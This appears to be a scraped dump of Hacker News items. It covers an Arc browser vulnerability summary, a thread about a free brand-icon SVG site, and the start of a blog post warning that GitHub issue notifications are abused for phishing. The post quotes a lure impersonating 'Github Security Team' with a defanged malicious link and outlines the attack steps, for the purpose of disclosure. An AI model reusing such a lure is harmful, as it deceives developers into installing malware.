reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A security researcher discovered a vulnerability in Arc's app, allowing arbitrary JavaScript execution on other users' browsers by manipulating the creatorID field.",
      "The vulnerability was reported, patched, and a $2,000 bounty was awarded within a day, with a CVE (CVE-2024-45489) assigned later.",
      "Arc responded by addressing privacy concerns, switching off Firebase, and initiating a bug bounty program to improve security."
    ],
    "commentSummary": [
      "The Browser Company, makers of Arc, disclosed a significant vulnerability that allowed access to users' browsers without visiting a specific website. The issue has been patched, and no users were affected.",
      "The company plans to move off Firebase, set up a bug bounty program, and bolster their security team, including hiring a new senior security engineer.",
      "The incident has sparked discussions about the adequacy of the $2,000 bug bounty, with many suggesting it should be significantly higher given the severity of the vulnerability."
    ],
    "points": 872,
    "commentCount": 269,
    "retryCount": 0,
    "time": 1726787082
  },
  {
    "id": 41597162,
    "title": "3K free SVG icons for popular brands",
    "originLink": "https://simpleicons.org/",
    "originBody": "Just a moment...*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}.main-content{margin:8rem auto;max-width:60rem;padding-left:1.5rem}@media (width Enable JavaScript and cookies to continue(function(){window._cf_chl_opt={cvId: '3',cZone: \"simpleicons.org\",cType: 'managed',cNounce: '66748',cRay: '8c6410ee896d81df',cHash: 'e1d256d97d86378',cUPMDTk: \"\\/?__cf_chl_tk=_i35Lmu5gzKBqKExVSR9vbyUPJnsTTyYkcD_3YP_Mgw-1726858907-0.0.1.1-4671\",cFPWv: 'g',cTTimeMs: '1000',cMTimeMs: '390000',cTplV: 5,cTplB: 'cf',cK: \"\",fa: \"\\/?__cf_chl_f_tk=_i35Lmu5gzKBqKExVSR9vbyUPJnsTTyYkcD_3YP_Mgw-1726858907-0.0.1.1-4671\",md: \"v9MHh6gM0VjRcNURh0rGMjtTRBHDNrSI6mlE_ZpIt.U-1726858907-1.1.1.1-A97VlPU6Mm4EtoMrb4_4__juc6Y8XdSqZxkz.3Q4pi3DW7437k0J6A814I_BFud1E7BL2XmTbM16s0Vrh_qYwFxkh2Dn7MjQdohzvY5hLeMoTaB2OZJvfEGNfk6L77o3pZACOAnh07IjZNkEC0tLvo2QGumff82.4YQHzMnMU7mjOErO28sX7iWqbo3EWBF1BvnDx6yp.ZBU5NtCjhkY9B1QJ8mGPM6AoEC5oNhU0wIU8mNH1z65jkL_nntx23YFGqJDYY9DreTdlUT.FyRDe2D3fsZJ1Mhucs6nMmoRhTaj.GUpfDWnmIBJ7.QXpY0Fu2JOuv91XyXF4Lzw.56H2O1t0rPPLtSR1XIDbGBpvU0_AFxc.XYlLZbLBR7J13Azb4LRJ1YRnws0Rd0iJaXfQMhSGq.jfXhz0FeYX37UU2fe7ovDu72wcIl19RtT8y64VMPdrWgUy4AerwCtKAwumIS9AvNeNTFGuakD9UDmHBOIgiqVMcrPJz4Xx9b11KfGgnyhiwKm8gWD5YGD7jFAZT52oAFfZ1D3ggR67FX_CjO.Bi1n1AC4TMN2pmbjNzlxcjX80CxPUJ8cAY98pmq1aQzKBDW9UVC4XOV5issebfSV9IaGjeEwiarxSCGkQF41hmCOgA.gsHrKwdbDflf5rd2H2sis7Lb0ty0Si3622jer_zimuNCcyC28Gs.9fQaNNsddA.aw_X1nKUbXlhRSUoEBEKFLly6ep6m_85ZWzh5wzLLCK.7Fka5_Me9ExLfoLahWVgSGynH.mrzovYIGeLEVoHvP0JQ2.D2LH.hE9R7ZO.jT0GmnyVULfqyhZwx22puJjcOac656RYXmD5nI4gpQ9tbcnP1R0E9PLfjsRu0MFsQ0ez_EsokMbqeD59QM_Ew5fFj6.CdpeEFbEMgTsY9aWqp2L96W_Ygw9OYtIqumRxdZWJUXmmPFSHHPjMwgE3234Tu.b5.1avaB.BIBYyU_IxYcjVkC_RxRShJeQolHBaHtcdc1llSbTcidP9_fZNDiwqpSmMMjbmvtyn9JCYnUwuaROhvbP0ZTgGRGBfTeLdSH.nyf.ueC3L5FlbStFq9JJppgmsrV3uRzPSjmuFvXbIX45wacxmpv5PnnIjTsMz2FOd2htY5.EYLm9ckCsxejCyqU9vsAAYbiwtvL60tgos1dwlDH_gsrs4YYQnOcKEtpO7gODDCwqaFv9KLfoWzCI4JFu5YYHuobbnY81QsJzJs.qyLWOLP.FxY3a.38odPpuz4uN2lwfSnmPSy4fbDut5v5.._le6rf91zhPGq0ZGGb4klaJXvvEI00VRo.A85mIpgA.SUrLf0R8NhTJ5rPQxN1TXYMbGfSKLhqhM5zBzdNir8to9BwFSczpsngUXlT4Q74PDVEJP8HhQGVu_NvWpN53nPqr.ASQnwamXb.AzkSVoQkRxNqyW4mF1jGcSJMleVqYIHQVTKQs7U.mf7KT.fO6GcbwupKptMgRYMYZr___n.mA4GOT.NEJDxDJK.OSP0zfwulu5L577D.7GOre5vFv1p2gHNTv7jS18u4sYw_YQydYvyN1C._k9Zfa99m3ihvyKyg57d1YGxhlW_y0Ng7GleFpTGMJlX1DT6QYuCQe3DYrthZIwQJdsFC1hOCgUJNilKpm2ENHEJj7rjPtsu6cn7hhSApLb2ySaFoR4Q3Vb3z.UEE0K_jwFCOwhPmsZfRSLnxIuclK41B57_6jonxxbs_S8VMC8OApK1x.S_KP8sxXhnSGbuAcTizMfhVn5vsKc.1BwE3BC1SCVzC98nZOY0gYmv1tax9sMpAuxdT1FJOwF9mOC9ckm3wv2dn5hWpeZbLZUUkn09KL0rT7RmNtbMvC.zlI5d19uBlr8UMu8OeJ_1VMe.PI.Q4dN6_UOI8FiTUIr01oEs5N2s2g8sOGGWrjyPd9HY8PAAE2A.4m6CvkH2Lawu4fBn8JNo6E1nlWVbNkOtKrYZcBmNaCf8Hz7JHe9ljF9EWR2lBx22uCX2VJI1iolgHy1TX8x3BV0GTqvtxHnC.TBtewtenM3aUL5A8rs6uBQIlzvN6xC0GLF9.9Syy9pQxpC24v14.Z3OOvG4nsaq1BKRM.xLjEZ0_yNTZ5P4RB6abguPRTMDoBzdvPw7vf6v3UUs\",mdrd: \"mUNz_O_D4AcD39dIXhRyGSK_14F7deSXKGXnBO.SikY-1726858907-1.1.1.1-w1awOPxxEeb9lRH8b_QqvtK4bRwTLbNmaWBbJJh5uPIvC.FwAw4mAmBi2zQIUgDdUhJ8bWRhXmcnDaY_huLKJ.bbGCIGc1veIupjHEi3EZHpoTijhXm1PHWKZrUvY05l_nXBtZ3Us3j7BW6je6aZw2PbJY17fT3sCc7QiLetIAEYAIvkuCkWeOyjkOOzg6TUKXLEauWRyhOpD69pl_O0yu_.qqcRBanBU5rRdtYRc0cS3rzUZMBg3FIHPpzDwKbSOo6LV2PqaY5qkVgA57VGyeKsX8UtMF9QyBxiLANokWt8oneh66wfS3o8qNew6ECTwtQQ_XETA6kH09JhplHm6U7eD1SVfLcnvVhFnrYILS0dZgB8TbczSMhezLg191.sS3LtOLsgPuNfWDggIy89xbzH.IZpVurOaUQ5uipxzjMUDI5x.MVVFsL5TSRpaUNvp_r9ywi6NALE2D41EPZWe5LLFdss1Dc.fmiklZgb5WzI1awFSi8gxuk.4kC99phBU9Ic9KjuJbD7xjW2TSQIS756.NC3_ucG7f62ylMwkls_lTNr_hdC0GmF6Uc4PwzHgCIpIxMweMHYRtlSNyCsfwlT9VZEWdPjii8scndEv9A5pFbraNeDPo_7.RyXNAlEDeAh3J5eyNx4ViTUXQt3QElHaX0RYA0YqLe.ZSpAu2x.fPiUn6u.eRG6G6IUJgRT8WiWymf4C8Kw_4ndXUj_52CU4qni11BLpQXIWRQyEMDtbSR5Tc07MC.k8JHWogxhwQRQudROi.Nrdzv3qUdcxzfV2yx_2oikO8uFxU0J73iv_JBIq54CPRG8rX.p8px28KZ0uD2Cru5FWHhrlSjyI4YpEYQ9P6SVd8irGWYnfXD3V7RI0FHNkvjJzjmdvIzpJkvhsl2g4GPbPGtyGnLgOdaTKr0TsXd1K_Pgh88Enl8c1BA9x3zsb5dN9NP0cgIqZoPzvjxOFSjSRZN4IMajlWDz.947pwZjXuGTepmjlqZv5eBfcpSL5skNnePqklHZzLmYlttUoiMwqBAuALPURMwucPmcrwyY8K4NpSvDlD08TTfQEu9nBCYlSkvJ5mtgxl30WjbzJ7vIxtzPF7Bky93TlVksiGEVKGw.ag7PUvdK9MoZL4K8aqT75cpjB8151aAJUVClVB9TDdimBnvDziqfB4Ea8lG1Y8770qeJqJymQUmGuymKtSRH5sIGWgMFLVXcI1861sxjZc.9Cw.RulMzq_tM3U05MLukm52YWd2Y1Y1Ug.JUc1yBZHXKhHhM5q5GSbaCJJxMPmIMM29eyRQXXutmAf9YoizTFFfnZ4hEsn_P3SM7WEuDyDnunPRxCa8TbE_0CEf5eNl6XB5VVU25P9foxgL_Pe2y_Ptx3upBJA1pHe8r4KaVGcoByMlo04p45TZq9Wa.9Ot0Del.pTPQN8gGqZWVthmwRU45oKn.ucggFwxY0BMGgwB4k83SyDVfgrb5AF62B4p7_pmJgn5N7NvlTJDbW2j6MLO2uxuz0yhSG0dTkuFfSz0Xo5TLnrPbR8.KB7nJ1U1XqvFy.ArDkzAk9Hmv1wBHAwJV6d2t6I5oAmz0mkNnBJ8qpuwIelNWAwQI77Xf2c_3yVaj1cchNn1TcjZRxvZamkRwHZIzea06ktndhjaRxS2f8WLFW1124oTZWm5rAXL2vLYAInv7lQutSxCUsZJpgZAMZsbWZF.B.znToxgR8GqC4VBHqGgF2IZy1Efy7_.ynSfYLLWGgwHW1W_RUYz.rhpMKV.GahEYhf5b9zQmAByyggGoBhnw7Bs.LpNZtl605Pap8TPe3KoWHAvZpXnv1R4_tUO5Vqy5F3ZgPNdSDEbUvMkvjAeWcjhjUxgO5npMDnM1lWa.zvM5m3A6Fe9.wIU.4_I99BjRq_3MgCeSRUeUMHHyciZqVdglg3Tb9QXLA1ThqHR6z6XtEg8Sonp6upFSHTHSeBPWOmgbBlsyD_EdftRL8AMYcQG66dqcDYTTeaVnGEk6pUAOA8IyZImleMTn_IUrTWc7rAp5wIuyJU8wE6EHvFqjc9MDMbPVAaSTbSIABxaFW2tH0G6SJSQUewiI928XkHMfcXr4GuZFwFhhPWVSn.cLAZSJwquN8wJ3Gje3egPAwGXt4x6ZcCZkqsQtUiCdQCo9nEsI.pyKrs2D_uakZa9Mjxval8znmyXjBQxhYGxfqy8B.qRe2huM2HTb5YPSKw5eAp_aQB3IweFadVQ3WejAdYvBm6yyXksVwbps.1oUSyj2tWWsNuh0usgLvPEdF_09j2U.WHsyBJ_Pgc3YF9CxjecCc8YDA7jmvEp_fpKX9TdIXqzjLC9HwECqUh..CVzky6hwo5FbyUNLTWTTVPPpam2P0L5wIUq1YMVFkg\",cRq: {ru: 'aHR0cHM6Ly9zaW1wbGVpY29ucy5vcmcv',ra: 'TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IEdvb2dsZWJvdC8yLjE7ICtodHRwOi8vd3d3Lmdvb2dsZS5jb20vYm90Lmh0bWwp',d: 'PP7ikNWeXOBS3wX8hnfMljMGt1hPGibcI90me9fopKsnVcnv3VWcsYCBsYDHnXhIy6RoXUuhArs1O79G9fdkgP1N5je++/zT90G0JZJq280yblrLPw/7axD0toMvLnGjQhDphcSU+tk6rw083P1AbcrAdVTrOqxTOAPXUnNKhLQM7pYDrFzt9VPRyH+qRmABtym17PJquttgvmie4xCv76Rzl0ZSL3OGA2KskUCWc6L+OfEdhwcfcjf5SeYCYW6hmg9cSyvPjLCxUSFfjURbucW3H/F04/hCUu+2jTlFsTffGZz9iPfWMoyckj1OaaHhWUQzuC/Rxq6oqFAfFFK9+FUBDmLmLk7y2UrPwyg5yffHlaVNGaFuxYuazpeg2d+0MjBtobxzqNOYX8gpPgV3nNoa1G+cNaKCFuClXc1DSmMypDkSVDBxdxkdiac+zGnaig/Q4+KEI8RUX8kq0MsCVTkPH9PgVgooiLMLSrrOPzHnoQKvG7ARWqEV1cJqRso9PxL5JTo27hqEyMKGgVhX/Q==',t: 'MTcyNjg1ODkwNy4wMDAwMDA=',cT: Math.floor(Date.now() / 1000),m: 'TnRreRccXkcrEAKvgDV5aNJpyw0KzHoeZBS7ELgXlGQ=',i1: 'r+N5Y7UrDF+oksr1iptDtQ==',i2: 'aREskxkoeOVp8VTVGWc1NQ==',zh: 'JYZ9L+YTnhP4K8ZP2qM9pIQKkauYgEODYwxK7uz3jOY=',uh: 'idqvltDEaw6z1eUpAaUFY/6rIUCphTJo6GMHGHVnQbg=',hh: 'bh3GIUbGRRhRKm9AVYyUlD4xVxOi6OSLPTK8exOttRg=',}};var cpo = document.createElement('script');cpo.src = '/cdn-cgi/challenge-platform/h/g/orchestrate/chl_page/v1?ray=8c6410ee896d81df';window._cf_chl_opt.cOgUHash = location.hash === '' && location.href.indexOf('#') !== -1 ? '#' : location.hash;window._cf_chl_opt.cOgUQuery = location.search === '' && location.href.slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length).indexOf('?') !== -1 ? '?' : location.search;if (window.history && window.history.replaceState) {var ogU = location.pathname + window._cf_chl_opt.cOgUQuery + window._cf_chl_opt.cOgUHash;history.replaceState(null, null, \"\\/?__cf_chl_rt_tk=_i35Lmu5gzKBqKExVSR9vbyUPJnsTTyYkcD_3YP_Mgw-1726858907-0.0.1.1-4671\" + window._cf_chl_opt.cOgUHash);cpo.onload = function() {history.replaceState(null, null, ogU);}}document.getElementsByTagName('head')[0].appendChild(cpo);}());",
    "commentLink": "https://news.ycombinator.com/item?id=41597162",
    "commentBody": "3K free SVG icons for popular brands (simpleicons.org)447 points by noashavit 20 hours agohidepastfavorite83 comments Fileformat 13 hours agoShameless self promotion: I build a logo search engine that currently has almost 500K logos indexed: https://logosear.ch/ Also, a good source of official SVG logos is BIMI, a standard that uses DNS to point to the URL of an SVG. Spec: https://bimigroup.org/ I recently scraped them for the top N domains: https://bimi-explorer.svg.zone/bimi/ reply Spunkie 3 hours agoparentIt's pretty surprising looking at this list that all these sites are paying $2000+ for a bimi cert. reply alt227 11 hours agoparentprevWell done! A couple of points. It would be great if it listed the file format and size on the results page, so I dont have to click on every logo to find that informatino out. How does this differ from doing a google image search of \"$BRAND logo\"? reply danielvaughn 16 hours agoprevI just don't see the need for sites like this, given that Iconify exists: https://icon-sets.iconify.design They probably have >90% of all the logos contained on simpleicons, along with nearly any other icon you could ever want or need. reply KTibow 16 hours agoparentSimple Icons is an icon pack on Iconify reply lloydatkinson 9 hours agorootparentI was just about to ask if it was. That's good, because honestly fuck every other spaghetti solution for icons. It's tiring, and iconify coupled with the related unplugin-icons library solves it. reply danielvaughn 6 hours agorootparentprevah interesting, ok yeah that makes sense actually. thanks for letting me know! reply edent 11 hours agoprevAs an alternative, I run SuperTinyIcons. They're all full colour and each icon is guaranteed to be under 1KB. https://github.com/edent/SuperTinyIcons reply robbiejs 11 hours agoparentVery nice, nice set of constraints! reply phkahler 19 hours agoprevSeems like a lot of trademark infringement suits about to come their way. Am I mistaken or is there no way this viable? In addition, nobody has any legal right to put others trademarks (use these) on anything without the trademark owners permission. So even if the site and distribution is somehow OK, nobody can really use them anyway. Right? reply tialaramex 17 hours agoparentYou're mostly fine unless you are confusing consumers. The purpose of these marks is exactly to avoid that, so you're going to get into a lot of trouble if you use the marks to mislead people in any way. Take the Air China logo - if a not-so-bright reader might think you are Air China, you're using this all wrong. But if you use an Air China logo to signify the routes actually flown by Air China on a free world map of international flights on your web site, well, yeah, that's Air China, nobody is misled, even a moron knows the little logos on your map of the world aren't actually jet aeroplanes. reply duxup 17 hours agoparentprevI'm not sure if simply offering a brand's logo would be trademark infringement. Years ago someone contacted me at the company I worked for claiming in some sorta pseudo legal language that we couldn't have one of our competitor's logos on our website. We had it on a promotional page comparing features across similar products. Turns out we can do that in the US. reply audiodude 17 hours agoparentprevIt's not trademark infringement to copy or display a logo. Trademark infringement happens when you confuse customers by using a logo or phrase and make them think that you're selling the actual product or that you're somehow endorsed by the original company. reply benatkin 19 hours agoparentprevThese and others have been online for a while, so I doubt it. There's more here, under the Brands / Social category: https://icones.js.org/ Yes, there are ways someone could use them that would not only run afoul of the trademark, but have trademark holders come after them. However, that doesn't make this useless, because there are proper and gray-area uses of these as well. reply diggan 18 hours agoparentprevFont Awesome been available since 2013 at least, featuring brand icons https://web.archive.org/web/20130608045113/http://fontawesom... Seems fine reply duxup 17 hours agorootparentI always assumed Font Awesome had some business agreement with those orgs eventually as font awesome did charge for some of their icons IIRC. Having said that, I'm not sure even that is legally necessary. reply strogonoff 17 hours agorootparentI imagine avoiding IP legal issues with things like icons could be less about signing agreements with all involved companies and more about having a team that can respond professionally to an inquiry. Businesses may often not really understand what’s going on and default to being worried about third-party use of their trademarks that they normally must defend. Perhaps they don’t need to worry in this case, where it may actually provide a bit of free advertisement, but if there’s no one on the other side then it wouldn’t help the case. IANAL reply anticorporate 19 hours agoparentprevThey probably each carry their own licensing and terms of use. I'd suspect there's a good number where reuse in some situations would be permitted, and in others would not. But every single one is going to be different, and just making assumptions is a quick way to blindly assume enormous legal liability. reply hobofan 13 hours agorootparentThat's why SimpleIcons contains metadata about that, so if you are worried about that, you can just exclude any icons that have explicit licensing information attached. reply anticorporate 5 hours agorootparentIf I were going to use these in my product, I would only do it the other way around. If there's no explicit license, I'm not touching someone else's trademark. reply aniviacat 19 hours agoparentprevI assume most brands are happy to see their icons being used/shared on as many platforms as possible. It's just free advertisment. If someone uses them in a context that's actually problematic for the brand, the brand can still sue them then. But that won't be the common case. reply ashu1461 19 hours agoparentprevYou can usually use the assets which are available on the official website, example for meta it is https://about.meta.com/brand/resources/facebook/logo/. If you see the official logo it has different colors than the one provided in the website, so you can't that for production use cases. reply knorthfield 11 hours agoparentprevDon’t tell every SaaS company ever. (Who I doubt all have robust legal processes for including logos on their homepages) reply ChrisMarshallNY 17 hours agoparentprevSupplying the assets is not a problem. Most stock art orgs have brands. I suspect that they can get into \"gray areas,\" if they charge for it. Using them is the problematic part. reply vultour 17 hours agoparentprevIt has existed for years and they actively remove icons when they get a takedown request. I'm sure most companies other than Oracle are happy to be there. reply nottorp 13 hours agoparentprevIsn't it also copyright infringement, and thus punishable by death in some enlightened jurisdictions [1], or at least by thousands in damages per infringement? How many infringements do you generate by just loading the front page? [1] Those most exposed to Hollywood lobbying. reply ArcaneMoose 17 hours agoprevDon't tell the guy who paid $70k for icons about this! reply shahzaibmushtaq 11 hours agoparentThe guy who paid $70k to convert 14000 existing icons/logos to SVG for commercial use because he wanted to use these icons according to his product standards. All existing SVGs icons are for personal and study purposes, that's why he spent so much amount out of good faith, moral compliance and professional courtesy. Moreover, this website has 3198 icons and what about the remaining icons as per his specifications? One very important thing to note here is that these SVG icons come with the GNU Affero General Public License meaning you must allow users to download the source code no matter whether it's modified or not. reply chrismorgan 10 hours agorootparent> these SVG icons come with the GNU Affero General Public License The only information I can find for this collection is CC-0 . Another important point is that licenses like AGPL are (simplifying slightly) copyright instruments, and for a work to be eligible for copyright protection, there must be creative effort, which I expect not to be the case for at least the vast majority of the icons—they’ll be mechanical translations, more or less. The original creators will hold copyright over the designs, but I don’t believe there will be any further copyright on such an icon collection, just as photographs of public domain artwork don’t get copyright protection. I am conscientious about these details, and I’d be comfortable ignoring an AGPL claim on such a thing. Also AGPL would not be a good license for a work like this. The GPL family of licenses are very specifically designed for code, and quite a bit of their terms are a little difficult to apply for such a collection as this. And their nature would largely prevent anyone from using the icons unless they wanted to license their stuff under (simplifying slightly) the same license. reply shahzaibmushtaq 3 hours agorootparentThank you for the correction. It doesn't come with the GNU Affero General Public License, and the GPL family of licenses are very specifically designed for code. If you can help, where can I learn more about licensing in plain English? reply taskforcegemini 11 hours agorootparentprevcan svg even be \"not open source\"? reply PaulRobinson 11 hours agorootparentSVG the standard, no. SVG icons, absolutely. In the same way Python is open source, but I can write software using Python that is not open source. reply druskacik 11 hours agorootparentBut if you use it on the web, it becomes \"open-source\" - not by license, but for all practical purposes. Or am I wrong? reply chrismorgan 10 hours agorootparentThe key to open source is the ability to modify it effectively. To use GPLv3 definitions : > The “source code” for a work means the preferred form of the work for making modifications to it. “Object code” means any non-source form of a work. For icons like this, it’s just that there is no object code, the source code is the only form there is. But supposing you had your SVG document with high precision, meaningful object IDs, Inkscape PowerStroke data (variable stroke thickness, which gets materialised in SVG as a path that gets fill), editor metadata and the likes, and then fed it through svgo and stripped all that stuff out, leaving just the bare bones, the original would be the source code, and the svg output object code. To put it in the frame of another format where the difference is more stark, if you design something in Photoshop and you export it as PNG but don’t distribute the PSD, that ain’t Open Source. You can modify it, but not properly. Or another: C, and a compiled binary. You can patch the binary, but that doesn’t make everything open source. reply Maken 10 hours agorootparentprevHaving the source code available is not open source nor free software. reply pestaa 10 hours agorootparentprevOpen source is a category of licenses. What you mean is that it is plaintext, and can be introspected. Great for many practical purposes, yes, but in business context, you are obligated to honor the actual license. reply albert_e 10 hours agorootparentprevmaybe if those SVGs are only used as assets inside an iOS/Android app but not on a webpage accessible via browser .... reply Hamuko 10 hours agorootparentprevIf you find a GitHub repository with code inside it and no LICENSE file (or any other license specifier), it is not open source. reply dspillett 9 hours agorootparentprevYes, unless you incorrectly assume “source is available” directly maps to “is open source”. reply snatchpiesinger 9 hours agorootparentprevIt can get minified/optimized by a tool. The \"source code\" is what you immediately edit, but you might not distribute that version, only a \"binary\" derived from it. reply spoonfeeder006 16 hours agoparentprevAnd don't tell them about the browser inspector nor how to copy SVG code using that reply bryanrasmussen 14 hours agorootparentI didn't want to tell you, but there is a thing called copyright. That said, if you copy SVG it is often easy to change the paths etc. and make it \"yours\". I guess I'd rather pay a small bit though. reply Culonavirus 14 hours agorootparent> a thing called copyright All the chatbot corps out there: And I took that personally. reply Brajeshwar 16 hours agoparentprevWhat is the story? URL to read? (Search resulted in another CEO's $70K salary thing.) Is this like Pepsi’s Million Dollar logo redesign? reply ec109685 16 hours agorootparentIt’s quite the saga, including the designer putting in their portfolio that they actually completed the project as they were ghosting their client: https://x.com/Shpigford/status/1807802947394588842 reply dgfitz 15 hours agorootparent$5.00/image. The math on that is absurd unless the artist is cranking what, 20 images an hour? Feels like they thought they had an edge, probably an LLM, and it didn’t work out. Also feels like it took $70k to generate 14,000 requirements, or the SOW is actually shit and this is all a disaster. Disclaimer: I don’t read twitter, if all this was spelled out in the link I apologize reply spoonfeeder006 13 hours agorootparentIf you already starting from an existing set from publicly available sources, and you just need to standardize them amongst each other for consistency, then I can see how that would be kinda reasonable, though I'm no designer myself perhaps things like giving them a consistent center or consistent brightness/contrast could be done programmatically as well, and maybe there are end user tools to do those things en masse other tweaks such as selecting between subtle variations found in each icon, or adding some artistic modification, shadow mimicking, etc... can possibly be done, to align the set to a certain pre-defined theme now that I think about it more seems like a pretty interesting kinda project actually > Arts, crafts and sciences uplift the world of being and are conducive to its exaltation ~Baha'u'llah the designer who chose to instead run with the money probably got insecure or bored, but they would probably be happier if they learned to appreciate the creative process more reply spoonfeeder006 15 hours agorootparentprevSo what, he was asking the designer to re-create already existing icons? Or brand new icons for each stock? Thats insanely fucked up either way of the designer leading them on like that or to ultimately cheat someone reply cyral 15 hours agorootparentRe-create existing icons, since a lot of these icon packs are not very standardized (e.g. some icons are full logos, some are actual icons, some have borders, some have backgrounds, etc). Here is a good tweet from another company on why they made their own logos: https://mobile.x.com/tcosta_co/status/1808174493170344345 reply springogeek 8 hours agoprevThis is cool, but I wish I didn't have to get past \"infinite\" scrolling to check the license of the icons in the footer (it's CC0). \"free\" is a bit ambiguous. reply keyle 17 hours agoprevI find it amusing because in the past, I would have used this to find the logo of the company that I'd work for at the time. I wonder how many employees of said brands will use this rather than their corporate environment to find an svg asset! reply al_borland 15 hours agoparentI’ve done this. The internal brand center was focused mostly on sales and people interfacing with customers. I was using it for internal tools though. I’m sure if I made customer facing sites I would need to go through more official channels and make sure all the branding guidelines are followed to the letter. reply wodenokoto 13 hours agoparentprevI had to convert and edit .ai files to get commonly used versions of our logo. reply 8n4vidtmkvmk 15 hours agoparentprevWish they'd make an SVG for my business! Hah reply albert_e 16 hours agoprevSurprisingly - No Microsoft logos. (Windows, Office, Azure, ...) reply KTibow 15 hours agoparentLooks like the legal team reached out and said that making monochrome icons isn't allowed [0] 0: https://github.com/simple-icons/simple-icons/issues/11236 reply BizyDev 14 hours agorootparentThat's really a shitty move from MS. But, technically, since they're still in the commit history, you can retrieve them for personnal/private use. reply albert_e 11 hours agorootparentprevvery interesting Adobe seems to have no problem selling monochrome logos of Microsoft products https://stock.adobe.com/search?k=ms+word&asset_id=595866420 reply wodenokoto 13 hours agoparentprevWhile it’s easier to have everything in one repo, Microsoft do have icon packs with svgs. reply qingcharles 16 hours agoprevI use these for everything, I've even corrected a couple of them as sites tend to tweak their logos all the time: https://github.com/tabler/tabler-icons reply shahzaibmushtaq 11 hours agoprevIf you are going to use them somewhere in your online product/project, kindly check the License agreement first. reply franciscop 11 hours agoparentAlso check the DISCLAIMER, which seems to be overriding the License: - Disclaimer: https://github.com/simple-icons/simple-icons/blob/master/DIS... - License (CC0): https://github.com/simple-icons/simple-icons/blob/master/LIC... reply InDubioProRubio 11 hours agorootparentOr just draw googly eyes on top and its a parody and totally legal art.. You can also have a NN turn it into a prompt and then recreate the SVG from prompt - shove it through the laundryAImat - nothing is sacred, the world they wanted they have now, let them suffer speared on there own swords. https://svg.io/ reply shahzaibmushtaq 3 hours agorootparentprevThe disclaimer is about including your icon(s) in simple-icons project, whereas the license is about how to use this project. reply anamexis 17 hours agoprevThe site is broken for me on Safari (Mac), works in Chrome. reply TRiG_Ireland 16 hours agoprevThe first one I downloaded (RTÉ colour) is an invalid SVG file. Incidentally, what is the third icon on the home page, /e/? There's a name impossible to google. reply rascul 16 hours agoparent> Incidentally, what is the third icon on the home page, /e/? There's a name impossible to google. https://e.foundation/e-os/ reply NewJazz 15 hours agorootparentSo degoogled you can't even google them! reply chrismorgan 11 hours agoparentprevThe É is entity-encoded as &#201; in the SVG, but then they generate `data:` URIs in this specific place, but don’t URL-encode the # as %23. reply TRiG_Ireland 6 hours agorootparentThe odd thing is that the black and white version works fine. reply rammer 12 hours agoprevFor all others Try Brandfetch and their plugins in Miro and canva reply mattigames 15 hours agoprevDoesn't have pornhub or Brazzers, not even logo SVG archiving escapes the tentacles of the moral police (keep in mind pornhub it's one of the top 10 most visited sites in the world) reply motoxpro 15 hours agoparentAlso no Microsoft logos (top two biggest companies in the world). The moral police are out of control! /s reply jawngee 12 hours agorootparentMicrosoft legal requested they remove their logos. https://github.com/simple-icons/simple-icons/issues/11236 reply mattigames 15 hours agorootparentprevExcept I actually looked for the other top 10 most popular websites before making my comment, they are all there (LinkedIn, Facebook, Twitter, et al), as you may know Microsoft.com doesn't even make it to the top 100 reply ctenb 12 hours agoprevI read this as svg icons of size 3 kilobytes reply astrowilliam 17 hours agoprevI did not expect to see AEW (All Elite Wrestling) on the list. reply txtsd 18 hours agoprevJust what I needed today. Thank you! reply bickett 16 hours agoprevOh that's great, I'm always looking for logos for apps reply 8n4vidtmkvmk 15 hours agoparentIs this sarcasm? This seems like an uncommon thing to want. reply rathboma 18 hours agoprevAutomatic like for including Beekeeper Studio :-D. reply lovegrenoble 18 hours agoprevAlternatively: https://github.com/simple-icons/simple-icons reply ThrowawayTestr 19 hours agoprev [–] Doesn't have Grindr, disappointing. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "SimpleIcons.org has released a collection of 3,000 free SVG icons for popular brands, attracting significant attention from the tech community.",
      "The collection is notable for its extensive range and ease of use, but users are advised to check licensing agreements to avoid potential trademark infringements.",
      "The release has sparked discussions about the legal implications of using brand logos without explicit permission, highlighting the importance of understanding intellectual property rights."
    ],
    "points": 447,
    "commentCount": 83,
    "retryCount": 0,
    "time": 1726786327
  },
  {
    "id": 41596466,
    "title": "GitHub notification emails used to send malware",
    "originLink": "https://ianspence.com/blog/2024-09/github-email-hijack/",
    "originBody": "GitHub Notification Emails Hijacked to Send Malware 2024-09-18 #github #security As an open source developer I frequently get emails from GitHub, most of these emails are notifications sent on behalf of GitHub users to let me know that somebody has interacted with something and requires my attention. Perhaps somebody has created a new issue on one of my repos, or replied to a comment I left, or opened a pull request, or perhaps the user is trying to impersonate GitHub security and trick me into downloading malware. If that last one sounds out of place, well, I have bad news for you - it's happened to me. Twice. In one day. Let me break down how this attack works: The attacker, using a throw-away GitHub account, creates an issue on any one of your public repos The attacker quickly deletes the issue You receive a notification email as the owner of the repo You click the link in the email, thinking it's legitimate You follow the instructions and infect your system with malware Now, as a savvy computer-haver you might think that you'd never fall for such an attack, but let me show you all the clever tricks employed here, and how attackers have found a way to hijack GitHub email system to send malicious emails directly to project maintainers. To start, let's look at the email message I got: In text form (link altered for your safety): Hey there! We have detected a security vulnerability in your repository. Please contact us at [https://]github-scanner[.]com to get more information on how to fix this issue. Best regards, Github Security Team Without me having already told you that this email is a notification about a new GitHub issue being created on my repo, there's virtually nothing to go on that would tell you that, because the majority of this email is controlled by the attacker. Everything highlighted in red is, in one way or another, something the attacker can control - meaning the text or content is what they want it to say: Unfortunately the remaining parts of the email that aren't controlled by the attacker don't provide us with any sufficient amount of context to know what's actually going on here. Nowhere in the email does it say that this is a new issue that has been created, which gives the attacker all the power to establish whatever context they want for this message. The attacker impersonates the \"Github Security Team\", and because this email is a legitimate email sent from Github, it passes most of the common phishing checks. The email is from Github, and the link in the email goes to where it says it does. GitHub can improve on these notification emails to reduce the effectiveness of this type of attack by providing more context about what action is the email for, reducing the amount of attacker-controlled content, and improving clarity about 